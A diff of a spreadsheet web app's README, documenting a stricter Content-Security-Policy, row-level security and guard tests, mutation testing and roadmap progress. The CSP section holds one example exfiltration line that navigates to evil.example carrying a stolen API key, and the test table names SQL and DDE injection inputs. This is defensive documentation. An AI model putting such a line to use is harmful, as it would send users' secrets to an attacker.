+there after [array formulas](#-formulas-that-answer-with-a-whole-table-array-formulas) shipped —
+spilling exists now; `XLOOKUP` simply has not been wired to it.)
 
 **An argument can be left out mid-formula** — `XLOOKUP(a,b,c,,-1)` skips `if_not_found` to reach the
 match mode, the way Excel writes it. Before this the parser rejected the empty slot, which made
@@ -1974,14 +2288,38 @@ So there is now a **Content-Security-Policy** (`next.config.ts`) aimed at the st
 injected script cannot `fetch` a stolen key to an attacker's server, and `form-action` closes the
 form route.
 
-**What it does not do, written here rather than left to be discovered:**
+**`script-src` has no `'unsafe-inline'` any more**, and getting there took two attempts worth
+writing down.
 
-- `script-src` still carries `'unsafe-inline'`. Next.js hydrates through inline scripts, and the
-  real fix — a per-request nonce from middleware — makes every page dynamic and throws away the
-  static rendering this app's speed rests on. **This is not a fix for XSS**, and pretending it were
-  would be worse than having no policy at all.
-- CSP cannot stop a top-level navigation (`location = "https://evil.example/?k=" + key`). The
-  `navigate-to` directive was dropped from the spec.
+The first was **Subresource Integrity** (`experimental.sri`), which hashes every emitted bundle and
+is appealing because it keeps pages prerendered. It does not work, and the browser said exactly
+why: six scripts got an `integrity` attribute and **two inline scripts did not**, because React's
+payload is part of the document. Chrome refused both and React threw #412 — the page never
+hydrated. SRI hashes files; a script inside the HTML is not a file. The setting stays anyway, since
+an integrity check on what a CDN serves costs nothing.
+
+The second is what ships: [`src/proxy.ts`](src/proxy.ts) mints a nonce per request, puts it in the
+policy and in the request headers, and Next stamps it onto its own inline scripts.
+`'strict-dynamic'` comes with it, which is what makes the directive strict rather than decorative —
+without it, a script injected with a `src` pointing at our own origin is still allowed by `'self'`.
+
+**It costs prerendering, and the cost was measured before it was accepted.** A nonce must differ
+per request, so no page can be built ahead of time; `await connection()` in the root layout says so
+out loud. Time to first byte on the same machine, twelve requests each, median:
+
+| | prerendered | per request |
+|---|---|---|
+| `/` | 5.3 ms | 14.6 ms |
+| `/app` | 5.6 ms | 19.9 ms |
+
+About ten to fifteen milliseconds of server time, against an LCP of 3.4 s on throttled mobile — it
+does not show. The real cost is that the HTML can no longer be cached at a CDN edge, which would
+matter for an audience spread across the world and does not matter for this.
+
+**What it still does not do:** CSP cannot stop a top-level navigation
+(`location = "https://evil.example/?k=" + key`). The `navigate-to` directive was dropped from the
+spec. Narrowing the exits is not the same as fixing XSS, and a strict `script-src` makes the
+injection itself much harder without making it impossible.
 
 **Measured, not asserted.** A `fetch` from inside the page to an origin outside the policy is
 refused — `Refused to connect … violates the following Content Security Policy directive` — while
@@ -1997,7 +2335,29 @@ The key box says both halves out loud too: kept in this tab only, never through 
 **use a key you can revoke rather than your main one**, because a key held in a web page can be read
 by anything running in that page.
 
-### 130 security tests
+### Testing the row-level security, in two halves
+
+The migrations ship policies. Until now nothing proved they were still there, let alone that they
+worked — and `alter table … enable row level security` is one line, without which a table answers
+everyone while the policy file below it still reads as though it protects something.
+
+**The half that runs everywhere** is `policies.test.ts`: it reads the migrations as text and checks
+their shape. RLS enabled on both tables. Four verbs spelled out on `workbooks` rather than one
+`for all`, so the list says what an anonymous visitor can do. `with check` on the update policy, and
+the trigger that pins `user_id`, because a member who may edit must not be able to edit the row into
+being theirs. The realtime policies asking the *same* question the workbook asks, rather than
+keeping a second opinion that would drift. No policy that says `using (true)`, none granted to
+`anon`, and every `security definer` helper with its `search_path` pinned. Proved by loosening one:
+turning the channel's `using` into `true` fails three of them.
+
+**The half that needs a database** is `npm run check:rls`, run deliberately against a project you
+own, with two accounts. It creates a workbook as A and then tries, as B, everything that must fail:
+read it, rename it, plant a row owned by A, invite a stranger, and join the live channel. Then A
+shares it and the same script checks the door opened exactly as far as it should — B can read and
+edit, and still cannot take ownership or delete. It finishes by trying to join the channel holding
+nothing but the anon key, which is the thing that used to work.
+
+### 209 security tests
 
 | File | Tests | What it covers |
 |---|---|---|
@@ -2006,14 +2366,20 @@ by anything running in that page.
 | `secretBox.test.ts` | 10 | AES-256-GCM, distinct ciphertexts, tamper detection, refusing to encrypt with no key rather than storing plain text |
 | `rateLimiter.test.ts` | 10 | Refusing past the limit, per-key counting, a `Retry-After` that really shrinks, a bounded key map under a flood of forged addresses |
 | `sourcesAuth.test.ts` | 9 | No token set means every request is refused, a blank token counts as unset, a token that is merely a prefix does not pass |
-| `validate.test.ts` | 4 | Which URL shapes are accepted, and which paths must be refused |
+| `validate.test.ts` | 10 | Which URL shapes are accepted and which paths must be refused · and on the database side: a query that is not a read, a string that is not a connection string, a type and a scheme that disagree |
 | `ai/formula/route.test.ts` | 6 | Demo mode must not reach Anthropic **even with an API key configured**, the local fallback still answers (not a 403), a missing question is a 400 |
 | `byok.test.ts` | 12 | The visitor's own key: which shapes are accepted, masking (enough to recognise, not enough to reuse), gone when the tab closes, blocked storage must not break the panel |
 | `demoSources.test.ts` | 9 | Demo mode: the sources it will call are the ones on the list, not the ones a visitor types |
 | `csvInjection.test.ts` | 11 | Every DDE payload has to leave unable to run, from the export button and the crash rescue alike · negative numbers, Thai text and blanks must be untouched |
+| `dataSources/sqlGuard.test.ts` | 17 | A saved query must be one SELECT: a semicolon hidden in a comment, a string or a dollar-quote, `SELECT … INTO OUTFILE`, `pg_read_file`, and a column called `updated_at` that must not be mistaken for one |
+| `server/dbGuard.test.ts` | 12 | Connection strings: both spellings of each kind, a password full of punctuation, unix sockets in both forms, private addresses refused, and an operator allow list that has to match the whole name |
+| `server/executeDbSource.test.ts` | 4 | The order of the refusals: a query that fails the guard is rejected before DNS is even asked |
+| `server/sourceRepo.test.ts` | 5 | What leaves the server: the connection string never does, only a description of it, and an unreadable one answers with dots rather than a guess |
+| `cloud/policies.test.ts` | 19 | The row-level security policies read as text: RLS switched on at all, four verbs spelled out, `with check` on update plus the trigger pinning the owner, the channel asking the same question the workbook asks, and nothing that says `using (true)` or is granted to `anon` |
+| `errorReport.test.ts` | 16 | A crash reporter in an app that promises your file never leaves: off unless configured, a fixed set of fields, capped sizes, a query string never sent, and keys/tokens/emails/Thai text scrubbed out of the stack — with an ordinary English trace left readable |
 | `cloud/liveMessage.test.ts` | 7 | Messages from other browsers on a live channel: a `row`/`col` that is not a usable index, a value that is not a string, one far larger than a cell, a kind that does not exist — all refused |
 
-Run them on their own: `npx vitest run src/lib/server/ src/app/api/sources/validate.test.ts src/app/api/ai/formula/ src/lib/byok.test.ts src/lib/csvInjection.test.ts src/lib/cloud/liveMessage.test.ts`
+Run them on their own: `npx vitest run src/lib/server/ src/lib/dataSources/sqlGuard.test.ts src/app/api/sources/validate.test.ts src/app/api/ai/formula/ src/lib/byok.test.ts src/lib/csvInjection.test.ts src/lib/cloud/ src/lib/errorReport.test.ts`
 
 ### OWASP Top 10, only the categories that actually apply here
 
@@ -2070,11 +2436,17 @@ Measured against a local production build (`npm run build && npm run start`) wit
 
 | Page | Performance | Accessibility | Best practices | SEO |
 |---|---|---|---|---|
-| Landing `/` | 85 | **100** | **100** | **100** |
-| App `/app` | 86 | **100** | **100** | **100** |
+| Landing `/` | 90 | **100** | **100** | **100** |
+| App `/app` | 84 | **100** | **100** | **100** |
 
-`/` — FCP 1.3s · LCP 3.8s · TBT 140ms · **CLS 0** · Speed Index 4.1s
-`/app` — FCP 1.0s · LCP 3.8s · TBT 200ms · **CLS 0** · Speed Index 1.0s
+`/` — FCP 1.0s · LCP 3.4s · TBT 160ms · **CLS 0** · Speed Index 1.0s
+`/app` — FCP 1.0s · LCP 3.5s · TBT 310ms · **CLS 0** · Speed Index 1.0s
+
+**Re-measured after the CSP nonce turned prerendering off**, rather than left standing from before
+it. The scores moved by a few points in both directions, which is what a Lighthouse run does
+between any two attempts; the +10–15 ms of server time the nonce costs does not show up against an
+LCP of three and a half seconds. A number in a README that was true on an older build is the
+failure this project has already had twice, so it was cheaper to run it again than to argue.
 
 **Accessibility 100 on both pages**, which agrees with the [`check:a11y`](#-testing) gate that runs axe on
 every PR — two different tools, same answer.
@@ -2149,20 +2521,20 @@ the framework bundle itself, which isn't a trade worth making here. Written down
 ## 🧪 Testing
 
 ```bash
-npm test      # 1058 cases across 65 files, via Vitest
+npm test      # 1305 cases across 80 files, via Vitest
 ```
 
 Testing is focused on the **formula engine, sort logic, JSON-to-table conversion, pagination, rate-limit backoff, Excel templates and live-block placement** — pure functions with no React/DOM dependency, so
 they run fast and give high confidence.
 
-**But not one of those 1058 cases opens the app**, and nearly every bug this project found by hand lived in
+**But not one of those 1305 cases opens the app**, and nearly every bug this project found by hand lived in
 the wiring *between* pieces that all passed their tests — the toolbar's "+ row" called `addRow`, which
 announced nothing, while `insertRowAtSelection` next to it announced correctly (both tested) · the AI
 assistant sent a range including its text header, because the context builder read raw `sheet.cells`
 instead of computed values (both tested) · one new button pushed the language toggle 42px off the screen.
 
 ```bash
-npm run check:e2e   # 8 flows in a real browser (needs a build)
+npm run check:e2e   # 10 flows in a real browser (needs a build)
 ```
 
 Flows are picked by one rule: **would a unit test already catch it?** If yes it does not belong there. What
@@ -2183,6 +2555,42 @@ computing once inserted, and a `429` saying how many seconds to wait rather than
 > Writing that flow, the first assertion reported the app sending `A1:A10` instead of `A1:A2`. **The fixture
 > was wrong, not the app**: the sample sheet fills A–E for ten rows, so the range the app chose was right.
 > Moving the numbers to the empty column F made it pass — and made the assertion mean something.
+
+### The tests that break the engine on purpose
+
+A test count says how many assertions exist. It does not say whether any of them would notice a bug,
+and a suite can be both large and asleep. `npm run check:mutants` answers the other question: it
+changes one character of the engine — a `<` to a `<=`, an `&&` to an `||`, a `*` to a `/` — runs the
+suite, and checks it goes red. A change the suite runs green over is a **survivor**, and survivors
+are the honest measure of a suite's reach.
+
+Hand-written rather than Stryker, for the same reason the property tests carry their own PRNG: no
+new dependency, the whole thing readable in one sitting, and the two decisions that matter — where a
+mutation may land, and what counts as killed — made here rather than inherited. Comments, strings
+and regular-expression literals are excluded, because a swapped `<` inside a doc comment changes
+nothing and would count as a survivor: a lie in the direction that flatters the suite.
+
+**The first run left six alive. Six tests were written from them, and each covers a specific way of
+being wrong that nothing else was watching:**
+
+| The change nothing noticed | What was actually missing |
+|---|---|
+| `COUNT`'s `&&` → `\|\|` | Every COUNT test used a range of numbers, where "not blank" and "is a number" agree. Text that is not a number was never counted against |
+| `SEQUENCE`'s `r * w` → `r / w` | Every test asked for a single column, where the width never multiplies |
+| `SEQUENCE`'s `* step` → `/ step` | Equivalent while the step is 1, which is what every test left it as |
+| `COUNTIFS`'s `c < len` → `<=` | It read one cell past each row; `null` coerces to 0, which matches `"<10"`, so the count doubled quietly |
+| `VLOOKUP`'s `key <= n` → `<` | An approximate match skipped an exact hit and returned the row above — a plausible neighbouring value |
+| `"FALSE"` → `true` in `toBoolean` | Nothing asked what the *text* `"FALSE"` means |
+
+The pinned sample now kills 31 of 32. The one survivor is **equivalent**: running SUMPRODUCT's row
+loop one past the end reads a row that is not there, a missing cell contributes zero to a product,
+and zero is then added to the total — the arithmetic cannot tell the difference. No test can kill
+it, and writing one that tried would be asserting an implementation detail instead of a result. The
+floor is 90%, a little under what the sample scores, because the job is to notice the suite getting
+*worse* rather than to demand a number a legitimate refactor could cost.
+
+The seed is pinned so a red cross means this commit rather than this draw. Looking for new gaps is
+something you do on purpose: `SEED=13 MUTANTS=60 npm run check:mutants`.
 
 ### The tests with no formulas written in them
 
@@ -2213,10 +2621,10 @@ once; disable `ArrowRight` in the grid and two assertions in the third fail. (Th
 second one stayed green: the `case` I inserted landed *after* the existing `case "ArrowRight"` and was dead
 code. Proving a gate means checking that the thing you meant to break actually broke.)
 
-> **1058 tests passed, and 43% of the assistant's answers were unusable** — because those tests mock
+> **1305 tests passed, and 43% of the assistant's answers were unusable** — because those tests mock
 > the model, so it returns what the test author imagined. A test count says what you thought to ask,
 > not whether you asked enough. Only a real API key found this: see
-> [What 1058 passing tests could not catch](#-what-1058-passing-tests-could-not-catch), repeatable
+> [What 1305 passing tests could not catch](#-what-1305-passing-tests-could-not-catch), repeatable
 > with `npm run check:ai`.
 
 | File | Cases | Tests |
@@ -2225,11 +2633,11 @@ code. Proving a gate means checking that the thing you meant to break actually b
 | `property.test.ts` | 8 | Property-based: each test generates hundreds of formulas and checks a rule that must always hold — arithmetic against an oracle sharing no engine code, precedence on expressions with no parentheses at all, evaluation never throwing, a zero shift being identity, two shifts equalling the shift of their sum, insert-then-delete of a row leaving every reference where it was, and SUM against adding the cells by hand |
 | `csvInjection.test.ts` | 11 | CSV injection from the attacker's side: every DDE payload has to leave unable to run, from the export button and from the crash rescue alike · negative numbers, Thai text and blanks must be untouched · export-then-import returns the original however many times it goes round |
 | `arrayFormulas.test.ts` | 21 | Formulas that answer with a shape and where the answer lands: spilling into the right cells, `#SPILL!` when something is in the way or the sheet ends and **nothing written at all when it refuses**, a formula reading spilled cells getting the right total even when it sits above the array, operators applied across a range, and all five array functions |
-| `sheetCodec.test.ts` | 11 | What is written to localStorage costs what was typed rather than what the sheet is sized to, pack/unpack returning every cell and format, saves in the old shape still loading and still rescuable after a crash, and malformed keys or out-of-bounds cells never losing data |
+| `sheetCodec.test.ts` | 12 | What is written to localStorage costs what was typed rather than what the sheet is sized to, pack/unpack returning every cell and format, saves in the old shape still loading and still rescuable after a crash, and malformed keys or out-of-bounds cells never losing data |
 | `crashRescue.test.ts` | 19 | Rescuing the sheet out of every broken shape localStorage can hold (no key, unparseable JSON, wrong types) without throwing, filenames Windows accepts, and the storage key matching what the store actually writes |
 | `parser.test.ts` | 20 | Operator precedence/associativity, ranges, function calls, syntax errors, arguments left out mid-call |
 | `evaluator.test.ts` | 10 | Arithmetic, comparisons, concatenation, reading cells/ranges, error propagation |
-| `functions.test.ts` | 81 | The whole function library across aggregate/rounding/logic/text/lookup, including INDEX/MATCH (leftward lookups, whole rows/columns, unsorted data), SUMIFS (several conditions, mismatched ranges), XLOOKUP (leftward lookups, a not-found fallback, nearest match on unsorted data, searching from the end) and DATEDIF (all six units, the month borrow, dates that don't exist) — plus dates that must not shift across timezones |
+| `functions.test.ts` | 92 | The whole function library across aggregate/rounding/logic/text/lookup, including INDEX/MATCH (leftward lookups, whole rows/columns, unsorted data), SUMIFS (several conditions, mismatched ranges), XLOOKUP (leftward lookups, a not-found fallback, nearest match on unsorted data, searching from the end) and DATEDIF (all six units, the month borrow, dates that don't exist) — plus dates that must not shift across timezones |
 | `formulaCatalog.test.ts` | 12 | What the palette actually builds: criteria quoting, a half-filled second condition, and every formula having text in both languages |
 | `shift.test.ts` | 8 | Relative reference shifting on copy/paste; absolute references staying put |
 | `structuralShift.test.ts` | 15 | Reference adjustment on row/column insert/delete, including `#REF!` and range grow/shrink |
@@ -2240,17 +2648,21 @@ code. Proving a gate means checking that the thing you meant to break actually b
 | `rateLimit.test.ts` | 20 | Parsing `Retry-After` (seconds and HTTP-date) and every `X-RateLimit-Reset` shape, separating a quota-exhausted 403 from a plain one, backoff maths |
 | `sheetMerges.test.ts` | 15 | Which cells a merge swallows, shifting merges on row/column insert and delete, dropping one that collapses to a single cell |
 | `sheetTemplate.test.ts` | 14 | Which cells are locked vs. fields, inline and range-backed dropdown options, column-width conversion |
-| `excelIO.test.ts` | 32 | Builds a real .xlsx and round-trips it: reading fields/dropdowns/widths, an unprotected file isn't a template, export→import comes back identical, and styling (fills/font sizes/borders/row heights/merges) round-trips, as do all five kinds of conditional formatting rule and cell notes (both the plain-string and Excel's rich-text form) |
+| `excelIO.test.ts` | 44 | Builds a real .xlsx and round-trips it: reading fields/dropdowns/widths, an unprotected file isn't a template, export→import comes back identical, and styling (fills/font sizes/borders/row heights/merges) round-trips, as do all five kinds of conditional formatting rule and cell notes (both the plain-string and Excel's rich-text form) |
 | `charts.test.ts` | 42 | Reading a range into series and labels (including a text label column), gaps for non-numbers, a zero-anchored axis, moving/resizing/clamping a chart's frame, what the legend names per kind, shifting on edits |
 | `server/urlGuard.test.ts` | 21 | Addresses the server refuses to reach (loopback, private ranges, cloud metadata, IPv6 link-local), IPv4 embedded in IPv6 in every spelling, non-http schemes, and the allowlist |
 | `server/sourcesAuth.test.ts` | 9 | No token means off, right/wrong/prefix tokens, and telling "switched off" apart from "wrong token" |
 | `server/secretBox.test.ts` | 10 | Encrypting and decrypting a credential, non-repeating ciphertext, tamper detection, refusing with no key, and reading pre-existing plaintext |
-| `cloud/cloud.test.ts` | 15 | On/off from the environment (a half-set deployment included), the stored shape and its JSON round trip, refusing a workbook from a newer version, and spotting another device's save |
+| `cloud/cloud.test.ts` | 24 | On/off from the environment (a half-set deployment included), the stored shape and its JSON round trip, refusing a workbook from a newer version, and spotting another device's save |
 | `cloud/liveSession.test.ts` | 22 | The live-editing rules: own echo, a tab that isn't here, a structural change → reload, the cell being edited → wait, a message that lost → drop · ties broken by client id, and both sides reaching the same answer |
 | `cloud/liveMessage.test.ts` | 7 | Validating what arrives from another browser (also counted among the security tests) |
 | `cloud/liveRoom.test.ts` | 21 | One room against a fake transport: an echo staying out of undo, an edit held until the editor closes (only the winner kept), a local edit that wins not being overwritten, and leaving actually going quiet |
 | `cloud/sheetDiff.test.ts` | 11 | What changed between two workbooks: one cell, an emptied cell, another tab, an added row → reload, 200+ cells at once → reload · and a count of how many rows were read, so copy-on-write staying true is a test |
-| `cloud/realtimeChannel.test.ts` | 5 | Turning presence into a list of people — where `id` and `from` disagreed and quietly produced "nobody else is here" |
+| `cloud/realtimeChannel.test.ts` | 9 | Turning presence into a list of people — where `id` and `from` disagreed and quietly produced "nobody else is here" |
+| `precedents.test.ts` | 11 | Which cells a formula is about: every argument rather than the first, through arithmetic and nested calls, a cross-sheet reference dropped rather than drawn at the same address here, and a whole-column range measured before it is built rather than after |
+| `dataValidation.test.ts` | 28 | What a cell will accept: empty values and formulas always pass, rules move with inserted and deleted rows, a list containing a comma is refused rather than written truncated, and a validation type this app has no equivalent for is ignored rather than approximated |
+| `namedRanges.test.ts` | 26 | Named ranges: a name that is also an address, has a space, or is reserved is refused with the reason; the name is substituted throughout the tree; precedents point at the real rectangle; repointing a name really does recompute (the cache is keyed by the name table); and a name does not shift when filled |
+| `store/sheetRules.test.ts` | 11 | Both features at the store: a value outside the rule is not saved and is announced, rules and names follow row edits, deleting a name leaves the formula reading `#NAME?` rather than rewritten, and undo brings the name back |
 | `store/liveStore.test.ts` | 12 | The wiring, with the socket replaced by a function call: a keystroke reaching the wire, an arriving edit reaching the document, the two not feeding each other for ever, and undo not erasing the other person's work |
 | `pdfFont.test.ts` | 5 | Embedding the Thai font, fetching it once per page, and falling back to the built-in font rather than failing the export |
 | `cellComments.test.ts` | 17 | Writing and clearing a note, trimming, following an insert/delete, and a note going with the row it was written about |
@@ -2284,8 +2696,8 @@ What's not done yet, and why — to show this is a known gap, not something forg
       across Node 20.19, 22.12 and 24
 - [x] **Cloud save / cross-device sync** — done as **bring-your-own-backend** (see ✨ Features):
       point it at your own Supabase project. Off by default, because this is an open-source project
-      rather than a hosted service. Still open: automatic sync, version history, and sharing a
-      workbook with someone else
+      rather than a hosted service. Sharing a workbook with another account shipped with the live
+      session that needed it. Still open: automatic sync and version history
 - [x] **Simultaneous editing** — done, over your own Supabase Realtime (see ✨ Features): people see
       each other type, presence shows where each cursor is, the cell you have open is never
       overwritten mid-word, and your undo does not erase their work. **Not a CRDT** — one cell typed
@@ -2316,8 +2728,9 @@ What's not done yet, and why — to show this is a known gap, not something forg
 - [x] **Formulas that answer with a whole table** — done (see [array formulas](#-formulas-that-answer-with-a-whole-table-array-formulas)):
       `SEQUENCE`, `TRANSPOSE`, `UNIQUE`, `SORT` and `FILTER` spilling into the cells beside them, `#SPILL!`
       when they do not fit with nothing written, and operators applied across a range (`A1:A9>50` is nine
-      answers). Still open: a sheet with arrays on it recomputes in full rather than incrementally, and
-      there is no `XMATCH`, `LET` or `LAMBDA`.
+      answers). **A sheet with arrays on it now recomputes incrementally too** — spill regions went into
+      the dependency graph, and a keystroke on a 3,000-row sheet holding one went from 26.4 ms to 2.3 ms.
+      Still open: no `XMATCH`, `LET` or `LAMBDA`.
 - [x] **Formulas across sheets** — done (see [formulas across sheets](#-formulas-across-sheets)):
       `=Sheet2!A1`, Thai names unquoted, cross-sheet staleness that follows a chain rather than one
       link, and cycles that span sheets. **This line used to say "`.xlsx` export writes computed
@@ -2331,7 +2744,10 @@ What's not done yet, and why — to show this is a known gap, not something forg
       to clear, and Excel's right-drag menu of fill options.
 - [x] **Find and replace** — done (see [find and replace](#-find-and-replace)). Still open: searching
       the displayed value as well as the raw text, and regular expressions.
-- [ ] **Freezing panes** beyond the already-sticky header row/column
+- [x] **Freezing panes** beyond the already-sticky header row/column — done (see [the Excel keyboard](#️-the-excel-keyboard)):
+      the split lives on the sheet, so it survives a reload, goes into undo, follows a row inserted above
+      it, and carries into `.xlsx` both ways. Still open: no split at an arbitrary scroll position, only
+      at the cursor, which is the shape Excel's own button has.
 - [x] **Conditional formatting** — done (see ✨ Features): compare/text/rank/colour scale/data bar,
       written into and read back from `.xlsx`. Still open: icon sets and custom-formula rules
 - [x] **Cell comments** — done (see ✨ Features): a note per cell with an amber corner, following
@@ -2365,16 +2781,58 @@ What's not done yet, and why — to show this is a known gap, not something forg
       hand-written generator and shrinker and a replayable seed. It found two real gaps on its first run
       (`TRUE()` failing to parse, `SUM` counting logical values sitting in cells), both now fixed. Still
       open: no property covers the `.xlsx` round trip, and the cross-sheet resolver is not generated against.
+- [x] **Mutation testing** — done: `npm run check:mutants` breaks the engine one character at a time and
+      checks the suite goes red, hand-written rather than Stryker so nothing new is installed. The first run
+      left six survivors and six tests were written from them, each covering a specific way of being wrong
+      that nothing was watching. The pinned sample now kills 31 of 32; the last one is an equivalent mutant
+      and is documented as such. Still open: it only covers the formula engine, and one whole suite run per
+      mutant means it cannot cover much more without getting slow.
+- [x] **Supply-chain and size gates** — done: `check:deps` requires every advisory to be fixed or written
+      down with a reason *and a review date*, so an accepted risk expires instead of becoming a habit; two
+      are currently accepted and both say why. `check:bundle` carries written size budgets and checks the
+      Supabase client is still in a chunk of its own, with a browser flow proving nothing asks for it.
+      CodeQL runs weekly as well as on every push, because an advisory that lands next month is new
+      information about code that has not changed. Still open: no gate on what a *page load* transfers,
+      only on what is built.
+- [x] **A gate for stale screenshots** — done: `check:screens` has each image declare which counted
+      figures it prints, records them at retake, and names the file when a count moves without one. It
+      cannot read pixels; it notices the world moving under them, which is what let an image reading
+      "519 tests" survive for days, and then one reading "980 tests". <!-- historic --> Still open: nothing watches a screenshot whose *layout* went
+      stale, only its figures.
+- [x] **Crash reports for the operator** — done: both error boundaries post a scrubbed report when
+      `NEXT_PUBLIC_ERROR_REPORT_URL` is set, and nothing at all when it is not. What a report may contain
+      is a fixed list; keys, tokens, emails and Thai text come out of the stack first, and the endpoint's
+      origin joins `connect-src` automatically. Still open: nothing reports an error that is *caught* —
+      a failed import or a refused fetch is still only a message on screen.
+- [x] **Show what a formula reads** — done (see [see what a formula is about](#-see-what-a-formula-is-about)):
+      the cells outlined on the grid and the ranges written out beside the formula bar, which is the
+      accessible half and turns out to be the more useful one. Still open: nothing shows the other
+      direction — which formulas read *this* cell — which is the question you ask before deleting a row.
+- [x] **Works offline** — done (see [opens with the network off](#-opens-with-the-network-off)): a
+      hand-written service worker caches the app itself, a manifest puts it on a home screen, and the
+      e2e gate switches the network off and reloads to prove it. Navigations are network-first so a
+      stale document never outlives its build; `/api/*` is never cached, because a stale number
+      presented as a current one is this project's least acceptable failure. Still open: nothing in
+      the UI says "you are offline" — the parts that need a network simply fail the way they always did.
+- [x] **Page setup for print** — done: type sized from the sheet's width against A4's real usable
+      space, the frozen rows repeated as a heading on every page, and page numbers so a printed stack
+      can be put back in order. Still open: no dialog — margins, a chosen scale and a print range are
+      the parts one would add, and the defaults are right often enough that it would mostly be a thing
+      to click through.
+- [x] **Version history** — done: a database trigger keeps the copy each save replaced, twenty per
+      workbook, readable by whoever can open the workbook and writable by nobody. Still open: no diff
+      between two versions, so "what changed" is still a question you answer by looking.
 - [x] **A Content-Security-Policy and the rest of the security headers** — done (`next.config.ts`):
       `connect-src` names only `api.anthropic.com` and the Supabase origin when one is configured, so an
       injected script cannot send the visitor's API key anywhere, alongside `frame-ancestors`,
       `object-src`, `base-uri`, `form-action`, `Referrer-Policy`, `nosniff` and `Permissions-Policy`.
-      It is a flow in `check:e2e`, proved by removing the header and watching the gate fail. **Still open:
-      `script-src` keeps `'unsafe-inline'`**, because Next.js hydrates through inline scripts and a
-      per-request nonce needs middleware, which makes every page dynamic. This closes the exit; it does
-      not stop XSS.
+      It is a flow in `check:e2e`, proved by removing the header and watching the gate fail. **`script-src`
+      no longer carries `'unsafe-inline'`** — `src/proxy.ts` mints a per-request nonce alongside
+      `'strict-dynamic'`. SRI was tried first to keep pages prerendered and does not work: an inline
+      script is not a file and cannot be hashed, so the page never hydrated at all. The price is
+      prerendering, measured at +10–15 ms of TTFB. Still open: CSP cannot stop a top-level navigation.
 - [x] **Tests that actually open the app (E2E) in CI** — done: `npm run check:e2e` drives Chromium
-      through 8 flows as its own CI job — a formula recalculating on screen, an `.xlsx` round trip through
+      through 10 flows as its own CI job — a formula recalculating on screen, an `.xlsx` round trip through
       the real buttons, keyboard-only navigation, undo, and whether anything is announced. Three bugs this
       project previously found by hand are now inside the gate's reach, and each gate was proved by breaking
       it. **The AI assistant is now covered too**, with `/api/ai/formula` stubbed: the range the panel
@@ -2427,9 +2885,22 @@ What's not done yet, and why — to show this is a known gap, not something forg
 - [x] **Full Excel keyboard coverage** — done (see [the Excel keyboard](#️-the-excel-keyboard)):
       `Ctrl+arrow` to the edge of the data, `Shift+arrow` to drag the selection, both together for
       each at once, `Home`/`End`/`Ctrl+Home`/`Ctrl+End`, Page keys measured in pixels, the two-step
-      `Ctrl+A`, and the view following the cursor in both axes. Still open: `Ctrl+Space` /
-      `Shift+Space` for a whole column or row, and `Ctrl+Enter` to fill a selection at once.
-- [ ] **Database sources** (Postgres/MySQL) — next phase: tech picks a table / saves a query once, users never see SQL
+      `Ctrl+A`, and the view following the cursor in both axes. **`Ctrl+Space` / `Shift+Space` for a
+      whole column or row and `Ctrl+Enter` to fill a selection are all in now** — and the fill shifts
+      references the way a drag does, since a formula that kept pointing at the anchor's row would
+      fill a column with the same wrong number. Still open: freezing panes beyond the sticky header.
+- [x] **Data validation** — done (see [Data validation](#-data-validation)): a list, a number range or a
+      length cap, refused before it is written and announced, moving with row edits and round-tripping
+      through `.xlsx`. Still open: "date between" and custom formulas, and a list containing a comma
+      cannot be written to the file.
+- [x] **Named ranges** — done (see [Named ranges](#-named-ranges)): Thai names work, substitution happens
+      at compile time so the dependency graph stays honest, names follow row edits, and they round-trip
+      through `.xlsx`. Still open: a name belongs to its sheet rather than the workbook, and there is no
+      name box beside the formula bar to jump to a range.
+- [x] **Database sources (Postgres/MySQL)** — done (see [Straight into a database](#-straight-into-a-database-postgresql--mysql)):
+      tech saves a connection string and a query once, users only ever see the table, and the statement runs
+      in a read-only transaction. Still open: a table picker instead of typed SQL, and a test that connects to
+      a real database — today only the pure modules around it are covered.
 - [ ] **Push-based realtime (SSE/WebSocket)** instead of polling, and filtering live data from the UI before placing it
 
 **Deliberately out of scope:**
